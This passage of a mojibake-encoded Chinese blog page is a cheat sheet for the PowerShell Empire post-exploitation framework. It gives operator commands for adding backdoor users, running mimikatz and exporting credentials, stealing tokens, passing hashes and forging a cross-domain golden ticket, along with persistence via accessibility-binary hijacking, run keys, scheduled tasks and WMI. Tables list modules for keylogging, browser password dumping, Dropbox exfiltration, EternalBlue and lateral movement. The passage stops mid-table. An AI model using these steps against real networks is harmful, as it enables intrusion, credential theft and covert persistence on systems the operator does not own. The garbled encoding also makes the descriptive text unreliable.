<h4 id="è¿æ¥é¶æœºåŠå…¶ä»–æ“ä½œ"><a href="#è¿æ¥é¶æœºåŠå…¶ä»–æ“ä½œ" class="headerlink" title="è¿æ¥é¶æœºåŠå…¶ä»–æ“ä½œ"></a>è¿æ¥é¶æœºåŠå…¶ä»–æ“ä½œ</h4><pre><code>&gt;interact target1 è¿æ¥
&gt;agent è¿”å›é¶æœºåˆ—è¡¨
&gt;back è¿”å›ä¸Šä¸€å±‚
&gt;shell net user 1 1 /add æ‰§è¡Œç³»ç»Ÿç›®å½•æ ¼å¼
&gt;mimikazt åŠ è½½æ¨¡å—è·å–å¯†ç 
&gt;creds æ•´ç†è·å–çš„å¯†ç ï¼Œcreds export /root/1.txt ä¿å­˜å¯†ç ï¼Œcreds hash/plaintextï¼Œæ˜¾ç¤ºæ ¼å¼
&gt;sc è·å–å½“å‰æ¡Œé¢æˆªå›¾ï¼Œæ–‡ä»¶å­˜å‚¨åœ¨./Empire/download/agentåå­—/screenshot
&gt;download c:\pass.txt ä¸‹è½½é¶æœºæ–‡ä»¶åˆ°æœ¬æœº
&gt;upload hacked.txt c:\hacked.txt ä¸Šä¼ æœ¬æœºæ–‡ä»¶åˆ°é¶æœº
</code></pre>
<h4 id="ææƒ-2"><a href="#ææƒ-2" class="headerlink" title="ææƒ"></a>ææƒ</h4><pre><code>&gt;agents åˆ—è¡¨ä¸­Usernameæ²¡æœ‰æ˜Ÿå·åˆ™éœ€è¦ææƒ
&gt;bypassuac listeneréœ€æŒ‡å®šä¸€ä¸ªç›‘å¬å™¨ ææƒ
&gt;usemodule privesc/ms16-032éœ€æŒ‡å®šä¸€ä¸ªç›‘å¬å™¨ ææƒ
&gt;usemodule privesc/powerup/allchecksæ‰§è¡Œæ‰€æœ‰è„šæœ¬æ£€æŸ¥æ¼æ´
</code></pre>
<h4 id="æ¨ªå‘"><a href="#æ¨ªå‘" class="headerlink" title="æ¨ªå‘"></a>æ¨ªå‘</h4><pre><code>æŸ¥è¯¢åŸŸç®¡ç™»å½•æœºå™¨
&gt;usemodule situational_awareness/network/powerview/user_hunter
</code></pre>
<h5 id="ä»¤ç‰Œçªƒå–-1"><a href="#ä»¤ç‰Œçªƒå–-1" class="headerlink" title="ä»¤ç‰Œçªƒå–"></a>ä»¤ç‰Œçªƒå–</h5><pre><code>&gt;mimikatz
&gt;creds  è·å–å¹¶æ•´ç†hashåŠå¯†ç 
&gt;pth &#123;ID&#125;çªƒå–ç®¡ç†å‘˜ä»¤ç‰Œ
&gt;steal_token &#123;PID&#125;
</code></pre>
<h5 id="ä¼šè¯æ³¨å…¥"><a href="#ä¼šè¯æ³¨å…¥" class="headerlink" title="ä¼šè¯æ³¨å…¥"></a>ä¼šè¯æ³¨å…¥</h5><pre><code>&gt;ps æŸ¥çœ‹è¿›ç¨‹
&gt;usemodule management/psinject è®¾ç½®ProcIPå’ŒListener
</code></pre>
<h5 id="Hashä¼ é€’"><a href="#Hashä¼ é€’" class="headerlink" title="Hashä¼ é€’"></a>Hashä¼ é€’</h5><pre><code>Invoke-PsExecå¯èƒ½ä¼šè¢«æŸ¥æ€
&gt;usemodule situational_awareness/network/powerview/find_localadmin_access åˆ—å‡ºå¯PSexecæ¨ªå‘ç§»åŠ¨çš„æœºå™¨
&gt;usemodule lateral_movement/invoke_psexecéœ€è®¾ç½®ComputerNameå’ŒListener
æˆ–
&gt;usemodule lateral_movement/invoke_wmiéœ€è®¾ç½®ComputerNameå’ŒListenerï¼ŒcredID
è·¨åŸŸ
çˆ¶åŸŸåŸŸæ§ï¼šdc.zone.com
å­åŸŸåŸŸæ§ï¼šsub.zone.com
å­åŸŸè®¡ç®—æœºï¼špc.sub.zone.com
å­åŸŸæ™®é€šç”¨æˆ·ï¼šsub\user1
æŸ¥çœ‹ä¿¡ä»»å…³ç³»
&gt;usemodule situational_awareness/network/powerview/get_domain_trust
è·å–çˆ¶åŸŸkrbtgt SIDï¼Œä½¿ç”¨management/user_to_sidè·å–sid
éœ€è®¾ç½®Domainå’ŒUser=krbtgt
&gt;usemodule credentials/mimikatz/dcsync è®¾ç½®UserName å­åŸŸ\krbtgt è·å–å­åŸŸhash
&gt;usemodule credentials/mimikatz/golden_ticket ä¼ªé€ sid 
éœ€è®¾ç½®Userä¸ºä¼ªé€ ç”¨æˆ· sidsä¼ªé€ çš„æ ‡è¯†ç¬¦&#123;krbtgt sid&#125;-519
&gt;usemodule credentials/mimikatz/dcsync è·å–çˆ¶åŸŸkrbtgtçš„hash
&gt;usemodule credentials/mimikatz/golden_ticket ä½¿ç”¨çˆ¶åŸŸkrbtgtè¿›è¡ŒPTHæ”»å‡»ï¼ŒæŒ‡å®šçˆ¶åŸŸCredIDï¼Œç”¨æˆ·åå’ŒåŸŸ
&gt;shell dir \\dc.zone.com\c$
</code></pre>
<h4 id="åé—¨-amp-æŒä¹…åŒ–"><a href="#åé—¨-amp-æŒä¹…åŒ–" class="headerlink" title="åé—¨&amp;æŒä¹…åŒ–"></a>åé—¨&amp;æŒä¹…åŒ–</h4><h5 id="æ˜ åƒåŠ«æŒ"><a href="#æ˜ åƒåŠ«æŒ" class="headerlink" title="æ˜ åƒåŠ«æŒ"></a>æ˜ åƒåŠ«æŒ</h5><pre><code>&gt;usemodule lateral_movement/invoke_wmi_debugger
è®¾ç½®Listenerï¼ŒComputerName(å¤§å†™)ï¼ŒTargetBinary(sethc.exe, Utilman.exe, osk.exe, Narrator.exe, Magnify.exe)ï¼Œåˆ†åˆ«æ˜¯ç²˜æ»é”®ï¼Œè½»æ¾è®¿é—®ï¼Œå±å¹•é”®ç›˜ï¼Œè®²è¿°äººï¼Œæ”¾å¤§é•œã€‚
</code></pre>
<h5 id="æ³¨å…¥æ³¨å†Œè¡¨å¯åŠ¨é¡¹"><a href="#æ³¨å…¥æ³¨å†Œè¡¨å¯åŠ¨é¡¹" class="headerlink" title="æ³¨å…¥æ³¨å†Œè¡¨å¯åŠ¨é¡¹"></a>æ³¨å…¥æ³¨å†Œè¡¨å¯åŠ¨é¡¹</h5><pre><code>&gt;usemodule persistence/elevated/registry*
è®¾ç½®Listenerï¼Œæ³¨å†Œè¡¨è·¯å¾„RegPath [HKLM\software\microsoft\windows\currentversion\run]
</code></pre>
<h5 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h5><pre><code>&gt;usemodule persistence/elevated/schtasks*
è®¾ç½®Listenerå’ŒDailyTime
</code></pre>
<h5 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h5><pre><code>&gt;usemodule persistence/elevated/wmi
è®¾ç½®Listener
</code></pre>
<h5 id="æ³¨å…¥SSP"><a href="#æ³¨å…¥SSP" class="headerlink" title="æ³¨å…¥SSP"></a>æ³¨å…¥SSP</h5><pre><code>æŸ¥çœ‹SSPç« èŠ‚
</code></pre>
<p>Collectionï¼ˆä¿¡æ¯é‡‡é›†ï¼‰</p>
<h4 id="Collectionï¼ˆä¿¡æ¯é‡‡é›†ï¼‰"><a href="#Collectionï¼ˆä¿¡æ¯é‡‡é›†ï¼‰" class="headerlink" title="Collectionï¼ˆä¿¡æ¯é‡‡é›†ï¼‰"></a>Collectionï¼ˆä¿¡æ¯é‡‡é›†ï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>collection/ChromeDump</td>
<td>æ”¶é›†chromeæµè§ˆå™¨ä¿å­˜çš„å¯†ç å’Œæµè§ˆå†å²è®°å½•</td>
</tr>
<tr>
<td>collection/FoxDump</td>
<td>æ”¶é›†Firefoxæµè§ˆå™¨ä¿å­˜çš„å¯†ç å’Œæµè§ˆå†å²è®°å½•</td>
</tr>
<tr>
<td>collection/USBKeylogger*</td>
<td>åˆ©ç”¨ETWä½œä¸ºé”®ç›˜è®°å½•</td>
</tr>
<tr>
<td>collection/WebcamRecorder</td>
<td>ä»æ‘„åƒå¤´æ•è·è§†é¢‘</td>
</tr>
<tr>
<td>collection/browser_data</td>
<td>æœç´¢æµè§ˆå™¨å†å²è®°å½•æˆ–ä¹¦ç­¾</td>
</tr>
<tr>
<td>collection/clipboard_monitor</td>
<td>æŒ‰æŒ‡å®šçš„æ—¶é—´é—´éš”ç›‘è§†å‰ªè´´æ¿</td>
</tr>
<tr>
<td>collection/file_finder</td>
<td>æŸ¥æ‰¾åŸŸä¸­çš„æ•æ„Ÿæ–‡ä»¶</td>
</tr>
<tr>
<td>collection/find_interesting_file</td>
<td>æŸ¥æ‰¾åŸŸä¸­çš„æ•æ„Ÿæ–‡ä»¶</td>
</tr>
<tr>
<td>collection/get_indexed_item</td>
<td>è·å–Windows desktop searchç´¢å¼•æ–‡ä»¶</td>
</tr>
<tr>
<td>collection/get_sql_column_sample_data</td>
<td>ä»ç›®æ ‡SQL Serverè¿”å›åˆ—ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td>collection/get_sql_query</td>
<td>åœ¨ç›®æ ‡SQLæœåŠ¡å™¨ä¸Šæ‰§è¡ŒæŸ¥è¯¢</td>
</tr>
<tr>
<td>collection/inveigh</td>
<td>Windows PowerShell LLMNR/mDNS/NBNSä¸­é—´äººå·¥å…·</td>
</tr>
<tr>
<td>collection/keylogger</td>
<td>é”®ç›˜è®°å½•åˆ°keystrokes.txtæ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶ä½ç½®/downloads/agentname/keystrokes.txt/agentname</td>
</tr>
<tr>
<td>collection/minidump</td>
<td>è¿›ç¨‹çš„å…¨å†…å­˜è½¬å‚¨ï¼ŒPowerSploitçš„Out-Minidump.ps1</td>
</tr>
<tr>
<td>collection/netripper</td>
<td>å°†NetRipperæ³¨å…¥ç›®æ ‡è¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹ä½¿ç”¨APIæŒ‚é’©ä»¥æ‹¦æˆªæ¥è‡ªä½ç‰¹æƒç”¨æˆ·çš„ç½‘ç»œæµé‡å’Œä¸åŠ å¯†ç›¸å…³çš„åŠŸèƒ½ï¼Œä»è€Œèƒ½å¤Ÿåœ¨åŠ å¯†ä¹‹å‰/è§£å¯†ä¹‹åæ•è·çº¯æ–‡æœ¬æµé‡å’ŒåŠ å¯†æµé‡ã€‚</td>
</tr>
<tr>
<td>collection/ninjacopy*</td>
<td>é€šè¿‡è¯»å–åŸå§‹å·å¹¶è§£æNTFSç»“æ„ï¼Œä»NTFSåˆ†åŒºå·ä¸­å¤åˆ¶æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>collection/packet_capture*</td>
<td>ä½¿ç”¨netshåœ¨ä¸»æœºä¸Šå¯åŠ¨æ•°æ®åŒ…æ•è·ã€‚</td>
</tr>
<tr>
<td>collection/prompt</td>
<td>æç¤ºå½“å‰ç”¨æˆ·åœ¨è¡¨å•æ¡†ä¸­è¾“å…¥å…¶å‡­æ®ï¼Œç„¶åè¿”å›ç»“æœã€‚</td>
</tr>
<tr>
<td>collection/screenshot</td>
<td>å±å¹•æˆªå›¾</td>
</tr>
<tr>
<td>collection/vaults/add_keepass_config_trigger</td>
<td>å¯»æ‰¾KeePassé…ç½®</td>
</tr>
<tr>
<td>collection/vaults/find_keepass_config</td>
<td>æ­¤æ¨¡å—æŸ¥æ‰¾å¹¶è§£æKeePass.config.xml (2.X)å’ŒKeePass.config.xml (1.X)æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>collection/vaults/get_keepass_config_trigger</td>
<td>è¯¥æ¨¡å—ä»KeePass 2.Xé…ç½®XMLæ–‡ä»¶ä¸­æå–è§¦å‘å™¨è¯´æ˜</td>
</tr>
<tr>
<td>collection/vaults/keethief</td>
<td>æ­¤æ¨¡å—æ£€ç´¢æœªé”å®šçš„KeePassæ•°æ®åº“çš„database mastey keyä¿¡æ¯</td>
</tr>
<tr>
<td>collection/vaults/remove_keepass_config_trigger</td>
<td>è¯¥æ¨¡å—ä»Find-KeePassConfigæ‰¾åˆ°çš„æ‰€æœ‰KeePassé…ç½®ä¸­åˆ é™¤æ‰€æœ‰è§¦å‘å™¨</td>
</tr>
</tbody></table>
<pre><code>&gt;usemodule collection/ tabè¡¥é½æŸ¥çœ‹æ¨¡å—
&gt;usemodule collection/screenshot è·å–å½“å‰æ¡Œé¢æˆªå›¾ï¼Œæ–‡ä»¶å­˜å‚¨åœ¨./Empire/download/agentåå­—/screenshot
&gt;usemodule collection/keylogger é”®ç›˜è®°å½•ï¼Œæ–‡ä»¶å­˜å‚¨åœ¨./Empire/download/agentåå­—/agent.log
&gt;usemodule situational_awareness/host/winenum æŸ¥çœ‹å½“å‰ç”¨æˆ·ã€ADç»„ã€å‰ªåˆ‡æ¿å†…å®¹ã€ç³»ç»Ÿç‰ˆæœ¬ã€å…±äº«ã€ç½‘ç»œä¿¡æ¯ã€é˜²ç«å¢™è§„åˆ™
&gt;usemodule situational_awareness/network/powerview/share_finder åˆ—å‡ºåŸŸå†…æ‰€æœ‰å…±äº«
&gt;usemodule situational_awareness/network/arpscan 
&gt;set Range 192.168.0.1-192.168.0.100 ARPæ‰«æï¼Œéœ€è®¾ç½®æ‰«æç½‘æ®µåŒºé—´
&gt;usemodule situational_awareness/network/portscan 
&gt;set Hosts 192.168.0.1-192.168.0.100 ç«¯å£æ‰«æï¼Œéœ€è®¾ç½®IPæˆ–IPæ®µ
&gt;usemodule situational_awareness/network/reverse_dns DNSä¿¡æ¯ï¼Œéœ€è®¾ç½®IP
&gt;set Range 192.168.0.1-192.168.0.100
&gt;usemodule situational_awareness/network/powerview/get_domain_controller æŸ¥æ‰¾åŸŸæ§
</code></pre>
<h4 id="Code-executionï¼ˆä»£ç æ‰§è¡Œï¼‰"><a href="#Code-executionï¼ˆä»£ç æ‰§è¡Œï¼‰" class="headerlink" title="Code_executionï¼ˆä»£ç æ‰§è¡Œï¼‰"></a>Code_executionï¼ˆä»£ç æ‰§è¡Œï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>code_execution/invoke_dllinjection</td>
<td>ä½¿ç”¨PowerSploitçš„Invoke-DLLInjectionå°†Dllæ³¨å…¥æ‚¨é€‰æ‹©çš„è¿›ç¨‹IDã€‚</td>
</tr>
<tr>
<td>code_execution/invoke_metasploitpayload</td>
<td>ç”Ÿæˆä¸€ä¸ªæ–°çš„éšè—PowerShellçª—å£ï¼Œè¯¥çª—å£ä¸‹è½½å¹¶æ‰§è¡ŒMetasploit Payloadã€‚è¿™ä¸Metasploitæ¨¡å—theexploit/multi/scripts/web_deliveryäº’åŠ¨</td>
</tr>
<tr>
<td>code_execution/invoke_ntsd</td>
<td>ä½¿ç”¨NT Symbolic Debuggeræ‰§è¡ŒEmpire launcherä»£ç </td>
</tr>
<tr>
<td>code_execution/invoke_reflectivepeinjection</td>
<td>ä½¿ç”¨PowerSploitçš„Invoke-ReflectivePEInjectionè¿›è¡Œåå°„PEæ³¨å…¥ï¼Œå°†DLL/EXEåŠ è½½è¿›PowerShellè¿›ç¨‹ä¸­ï¼Œæˆ–è€…å°†DLLåŠ è½½è¿›è¿œç¨‹è¿›ç¨‹ä¸­</td>
</tr>
<tr>
<td>code_execution/invoke_shellcode</td>
<td>ä½¿ç”¨PowerSploitçš„Invokeâ€“Shellcodeæ³¨å…¥Shellcode</td>
</tr>
<tr>
<td>code_execution/invoke_shellcodemsil</td>
<td>æ‰§è¡Œshellcode</td>
</tr>
</tbody></table>
<h4 id="Credentialsï¼ˆèº«ä»½å‡­è¯ï¼‰"><a href="#Credentialsï¼ˆèº«ä»½å‡­è¯ï¼‰" class="headerlink" title="Credentialsï¼ˆèº«ä»½å‡­è¯ï¼‰"></a>Credentialsï¼ˆèº«ä»½å‡­è¯ï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>credentials/credential_injection*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-CredentialInjectionåˆ›å»ºå…·æœ‰æ˜æ–‡å‡­è¯çš„ç™»å½•ï¼Œè€Œä¸ä¼šè§¦å‘äº‹ä»¶ID 4648ä½¿ç”¨æ˜¾å¼å‡­æ®å°è¯•ç™»å½•</td>
</tr>
<tr>
<td>credentials/enum_cred_store</td>
<td>ä»Windowså‡­æ®ç®¡ç†å™¨ä¸­è½¬å‚¨å½“å‰äº¤äº’ç”¨æˆ·çš„çº¯æ–‡æœ¬å‡­æ®</td>
</tr>
<tr>
<td>credentials/invoke_kerberoast</td>
<td>ä¸ºå…·æœ‰éç©ºæœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNï¼‰çš„æ‰€æœ‰ç”¨æˆ·è¯·æ±‚kerberosç¥¨æ®ï¼Œå¹¶å°†å…¶æå–ä¸ºJohnæˆ–Hashcatå¯ç”¨æ ¼å¼</td>
</tr>
<tr>
<td>credentials/powerdump*</td>
<td>ä½¿ç”¨Posh-SecModçš„Invoke-PowerDumpä»æœ¬åœ°ç³»ç»Ÿä¸­è½¬å‚¨å“ˆå¸Œ</td>
</tr>
<tr>
<td>credentials/sessiongopher</td>
<td>æå–WinSCPå·²ä¿å­˜çš„ä¼šè¯å’Œå¯†ç </td>
</tr>
<tr>
<td>credentials/tokens</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-TokenManipulationæšä¸¾å¯ç”¨çš„ç™»å½•ä»¤ç‰Œï¼Œå¹¶ä½¿ç”¨å®ƒä»¬åˆ›å»ºæ–°çš„è¿›ç¨‹</td>
</tr>
<tr>
<td>credentials/vault_credential*</td>
<td>è¿è¡ŒPowerSploitçš„Get-VaultCredentialä»¥æ˜¾ç¤ºWindows Vaultå‡­è¯å¯¹è±¡ï¼ŒåŒ…æ‹¬æ˜æ–‡Webå‡­è¯</td>
</tr>
<tr>
<td>credentials/mimikatz/cache*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»¥æå–MSCache(v2) hashes</td>
</tr>
<tr>
<td>credentials/mimikatz/certs*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°å°†æ‰€æœ‰è¯ä¹¦æå–åˆ°æœ¬åœ°ç›®å½•</td>
</tr>
<tr>
<td>credentials/mimikatz/command*</td>
<td>ä½¿ç”¨è‡ªå®šä¹‰å‘½ä»¤è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°</td>
</tr>
<tr>
<td>credentials/mimikatz/dcsync</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ï¼Œä»¥é€šè¿‡Mimikatzçš„lsadump::dcsyncæ¨¡å—æå–ç»™å®šçš„å¸æˆ·å¯†ç </td>
</tr>
<tr>
<td>credentials/mimikatz/dcsync_hashdump</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ï¼Œä»¥ä½¿ç”¨Mimikatzçš„lsadump::dcsyncæ¨¡å—æ”¶é›†æ‰€æœ‰åŸŸå“ˆå¸Œ</td>
</tr>
<tr>
<td>credentials/mimikatz/extract_tickets</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ï¼Œä»¥base64ç¼–ç å½¢å¼ä»å†…å­˜ä¸­æå–kerberosç¥¨æ®</td>
</tr>
<tr>
<td>credentials/mimikatz/golden_ticket</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»¥ç”Ÿæˆé»„é‡‘ç¥¨æ®å¹¶å°†å…¶æ³¨å…¥å†…å­˜</td>
</tr>
<tr>
<td>credentials/mimikatz/keys*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»¥å°†æ‰€æœ‰å¯†é’¥æå–åˆ°æœ¬åœ°ç›®å½•</td>
</tr>
<tr>
<td>credentials/mimikatz/logonpasswords*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»¥ä»å†…å­˜ä¸­æå–çº¯æ–‡æœ¬å‡­æ®ã€‚</td>
</tr>
<tr>
<td>credentials/mimikatz/lsadump*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»¥ä»å†…å­˜ä¸­æå–ç‰¹å®šçš„ç”¨æˆ·å“ˆå¸Œã€‚ åœ¨åŸŸæ§åˆ¶å™¨ä¸Šå¾ˆæœ‰ç”¨ã€‚</td>
</tr>
<tr>
<td>credentials/mimikatz/mimitokens*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»¥åˆ—å‡ºæˆ–æšä¸¾ä»¤ç‰Œã€‚</td>
</tr>
<tr>
<td>credentials/mimikatz/pth*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»¥æ‰§è¡Œsekurlsa::pthæ¥åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ã€‚</td>
</tr>
<tr>
<td>credentials/mimikatz/purge</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»å†…å­˜ä¸­æ¸…é™¤æ‰€æœ‰å½“å‰çš„kerberosç¥¨æ®</td>
</tr>
<tr>
<td>credentials/mimikatz/sam*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ä»å®‰å…¨å¸æˆ·ç®¡ç†å™¨ï¼ˆSAMï¼‰æ•°æ®åº“ä¸­æå–å“ˆå¸Œ</td>
</tr>
<tr>
<td>credentials/mimikatz/silver_ticket</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ï¼Œä»¥ç”ŸæˆæœåŠ¡å™¨/æœåŠ¡çš„ç™½é“¶ç¥¨æ®å¹¶å°†å…¶æ³¨å…¥å†…å­˜ã€‚</td>
</tr>
<tr>
<td>credentials/mimikatz/trust_keys*</td>
<td>è¿è¡ŒPowerSploitçš„Invoke-Mimikatzå‡½æ•°ï¼Œä»åŸŸæ§åˆ¶å™¨ä¸­æå–åŸŸä¿¡ä»»å¯†é’¥ã€‚</td>
</tr>
</tbody></table>
<h4 id="Exfiltrationï¼ˆæ•°æ®çªƒå–ï¼‰"><a href="#Exfiltrationï¼ˆæ•°æ®çªƒå–ï¼‰" class="headerlink" title="Exfiltrationï¼ˆæ•°æ®çªƒå–ï¼‰"></a>Exfiltrationï¼ˆæ•°æ®çªƒå–ï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>exfiltration/egresscheck</td>
<td>å¯ç”¨äºå¸®åŠ©æ£€æŸ¥ä¸»æœºä¸å®¢æˆ·ç«¯ç³»ç»Ÿä¹‹é—´çš„å‡ºå£ï¼Œè¯¦ç»†ä¿¡æ¯ï¼š<a target="_blank" rel="noopener" href="https://github.com/stufus/egresscheck-framework">https://github.com/stufus/egresscheck-framework</a></td>
</tr>
<tr>
<td>exfiltration/exfil_dropbox</td>
<td>ä¸‹è½½æ–‡ä»¶åˆ°dropbox</td>
</tr>
</tbody></table>
<h4 id="Exploitationï¼ˆæ¼æ´åˆ©ç”¨EXPï¼‰"><a href="#Exploitationï¼ˆæ¼æ´åˆ©ç”¨EXPï¼‰" class="headerlink" title="Exploitationï¼ˆæ¼æ´åˆ©ç”¨EXPï¼‰"></a>Exploitationï¼ˆæ¼æ´åˆ©ç”¨EXPï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>exploitation/exploit_eternalblue</td>
<td>MS17_010æ°¸æ’ä¹‹è“æ¼æ´åˆ©ç”¨</td>
</tr>
<tr>
<td>exploitation/exploit_jboss</td>
<td>Jbossæ¼æ´åˆ©ç”¨</td>
</tr>
<tr>
<td>exploitation/exploit_jenkins</td>
<td>åœ¨æœªæˆæƒè®¿é—®çš„Jenkinsè„šæœ¬æ§åˆ¶å°ä¸Šè¿è¡Œå‘½ä»¤</td>
</tr>
</tbody></table>
<h4 id="Lateral-movementï¼ˆæ¨ªå‘ç§»åŠ¨ï¼‰"><a href="#Lateral-movementï¼ˆæ¨ªå‘ç§»åŠ¨ï¼‰" class="headerlink" title="Lateral_movementï¼ˆæ¨ªå‘ç§»åŠ¨ï¼‰"></a>Lateral_movementï¼ˆæ¨ªå‘ç§»åŠ¨ï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>lateral_movement/inveigh_relay</td>
<td>smbä¸­ç»§æ”»å‡»</td>
</tr>
<tr>
<td>lateral_movement/invoke_dcom</td>
<td>ä½¿ç”¨DCOMåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œstager</td>
</tr>
<tr>
<td>lateral_movement/invoke_executemsbuild</td>
<td>è¯¥æ¨¡å—åˆ©ç”¨WMIå’ŒMSBuildç¼–è¯‘å¹¶æ‰§è¡Œä¸€ä¸ªåŒ…å«Empire launcherçš„xmlæ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td>lateral_movement/invoke_psexec</td>
<td>PsExecæ¨ªå‘ç§»åŠ¨</td>
</tr>
<tr>
<td>lateral_movement/invoke_psremoting</td>
<td>è¿œç¨‹PowerShellæ¨ªå‘ç§»åŠ¨</td>
</tr>
<tr>
<td>lateral_movement/invoke_smbexec</td>
<td>SMBExecæ¨ªå‘ç§»åŠ¨</td>
</tr>
<tr>
<td>lateral_movement/invoke_sqloscmd</td>
<td>åˆ©ç”¨xp_cmdshellæ¨ªå‘ç§»åŠ¨</td>
</tr>
<tr>
<td>lateral_movement/invoke_sshcommand</td>
<td>åˆ©ç”¨SSHæ¨ªå‘ç§»åŠ¨</td>
</tr>
<tr>
<td>lateral_movement/invoke_wmi</td>
<td>åˆ©ç”¨WMIæ¨ªå‘ç§»åŠ¨</td>
</tr>
<tr>
<td>lateral_movement/invoke_wmi_debugger</td>
<td>ä½¿ç”¨WMIå°†è¿œç¨‹æœºå™¨ä¸Šçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„è°ƒè¯•å™¨è®¾ç½®ä¸ºcmd.exeæˆ–stager</td>
</tr>
<tr>
<td>lateral_movement/jenkins_script_console</td>
<td>åˆ©ç”¨æœªæˆæƒè®¿é—®çš„Jenkinsè„šæœ¬æ§åˆ¶å°æ¨ªå‘ç§»åŠ¨</td>
</tr>
<tr>
<td>lateral_movement/new_gpo_immediate_task</td>
<td>åˆ©ç”¨GPOä¸­çš„è®¡åˆ’ä»»åŠ¡æ¨ªå‘ç§»åŠ¨</td>
</tr>
</tbody></table>
<h4 id="Managementï¼ˆç®¡ç†ï¼‰"><a href="#Managementï¼ˆç®¡ç†ï¼‰" class="headerlink" title="Managementï¼ˆç®¡ç†ï¼‰"></a>Managementï¼ˆç®¡ç†ï¼‰</h4><table>
<thead>
<tr>
<th>æ¨¡å—å</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>management/enable_rdp*</td>
<td>åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šå¯ç”¨RDPå¹¶æ·»åŠ é˜²ç«å¢™ä¾‹å¤–ã€‚</td>
</tr>
<tr>
<td>management/disable_rdp*</td>
<td>åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šç¦ç”¨RDP</td>
</tr>
<tr>
<td>management/downgrade_account</td>
<td>åœ¨ç»™å®šçš„åŸŸå¸æˆ·ä¸Šè®¾ç½®å¯é€†åŠ å¯†ï¼Œç„¶åå¼ºåˆ¶ä¸‹æ¬¡ç”¨æˆ·ç™»å½•æ—¶è®¾ç½®å¯†ç ã€‚</td>
</tr>
<tr>
<td>management/enable_multi_rdp*</td>
<td>å…è®¸å¤šä¸ªç”¨æˆ·å»ºç«‹åŒæ—¶çš„RDPè¿æ¥ã€‚</td>
</tr>
<tr>
<td>management/get_domain_sid</td>
<td>è¿”å›å½“å‰æŒ‡å®šåŸŸçš„SID</td>
</tr>
<tr>
<td>management/honeyhash*</td>
<td>å°†äººå·¥å‡­è¯æ³¨å…¥åˆ°LSASS</td>
</tr>
<tr>
<td>management/invoke_script</td>
<td>è¿è¡Œè‡ªå®šä¹‰è„šæœ¬</td>
</tr>
<tr>
<td>management/lock</td>
<td>é”å®šå·¥ä½œç«™çš„æ˜¾ç¤º</td>
</tr>
<tr>
<td>management/logoff</td>
<td>ä»è®¡ç®—æœºä¸Šæ³¨é”€å½“å‰ç”¨æˆ·ï¼ˆæˆ–æ‰€æœ‰ç”¨æˆ·ï¼‰</td>
</tr>
<tr>
<td>management/psinject</td>
<td>åˆ©ç”¨Powershellæ³¨å…¥Stephen Fewerå½¢æˆçš„ReflectivePickï¼Œè¯¥ReflectivePickåœ¨è¿œç¨‹è¿‡ç¨‹ä¸­ä»å†…å­˜æ‰§è¡ŒPSä»£ç </td>
</tr>
<tr>
<td>management/reflective_inject</td>
<td>åˆ©ç”¨Powershellæ³¨å…¥Stephen Fewerå½¢æˆçš„ReflectivePickï¼Œè¯¥ReflectivePickåœ¨è¿œç¨‹è¿‡ç¨‹ä¸­ä»å†…å­˜æ‰§è¡ŒPSä»£ç </td>
</tr>
<tr>
<td>management/restart</td>
<td>é‡æ–°å¯åŠ¨æŒ‡å®šçš„æœºå™¨</td>
</tr>
<tr>
<td>management/runas</td>
<td>ç»•è¿‡GPOè·¯å¾„é™åˆ¶</td>
</tr>
<tr>
<td>management/shinject</td>
